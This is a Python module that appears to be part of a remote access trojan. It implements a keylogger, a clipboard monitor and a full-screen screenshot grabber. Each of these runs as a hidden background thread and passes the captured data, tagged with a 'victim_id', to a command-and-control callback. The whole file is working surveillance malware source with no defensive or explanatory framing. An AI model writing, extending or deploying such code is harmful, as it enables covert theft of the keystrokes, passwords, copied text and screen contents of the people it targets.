"""
Surveillance: Keylogging, Clipboard monitoring, Screenshots
All run as background threads and send data to C2 via callback.
"""
import threading
import time
import os
import base64
import ctypes
from datetime import datetime

# Optional imports
try:
    import pynput.keyboard as pynput_keyboard
except ImportError:
    pynput_keyboard = None

try:
    import win32clipboard
except ImportError:
    win32clipboard = None

try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None

class Surveillance:
    def __init__(self, victim_id, send_callback):
        self.victim_id = victim_id
        self.send_callback = send_callback
        self.keylog_buffer = []
        self.keylog_lock = threading.Lock()
        self.running = False

    def start(self):
        self.running = True
        # Start keylogger thread
        if pynput_keyboard:
            t = threading.Thread(target=self._keylogger_loop, daemon=True)
            t.start()
        # Start clipboard monitor
        if win32clipboard:
            t = threading.Thread(target=self._clipboard_monitor, daemon=True)
            t.start()
        # Screenshots are handled separately by the main loop calling capture_screenshot()

    def stop(self):
        self.running = False

    # ---- Keylogger ----
    def _keylogger_loop(self):
        def on_press(key):
            if not self.running:
                return False
            try:
                char = key.char if hasattr(key, 'char') and key.char else str(key)
            except:
                char = str(key)
            with self.keylog_lock:
                self.keylog_buffer.append({"key": char, "time": datetime.now().isoformat()})
                if len(self.keylog_buffer) >= 50:
                    self._send_keylog()
        def on_release(key):
            if key == pynput_keyboard.Key.esc:
                return False  # allow escape to stop (for testing)
        with pynput_keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

    def _send_keylog(self):
        with self.keylog_lock:
            if not self.keylog_buffer:
                return
            data = self.keylog_buffer[:]
            self.keylog_buffer = []
        self.send_callback({"victim_id": self.victim_id, "type": "keylog", "content": data})

    # ---- Clipboard Monitor ----
    def _clipboard_monitor(self):
        last_text = None
        while self.running:
            try:
                win32clipboard.OpenClipboard(0)
                if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                    text = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
                    if text and text != last_text:
                        last_text = text
                        self.send_callback({
                            "victim_id": self.victim_id,
                            "type": "clipboard",
                            "content": {"text": text, "timestamp": datetime.now().isoformat()}
                        })
                win32clipboard.CloseClipboard()
            except:
                pass
            time.sleep(3)

    # ---- Screenshot ----
    @staticmethod
    def capture_screenshot():
        if not ImageGrab:
            return None
        try:
            screenshot = ImageGrab.grab(all_screens=True)
            import io
            buffered = io.BytesIO()
            screenshot.save(buffered, format="PNG")
            img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')
            return img_base64
        except Exception as e:
            return None
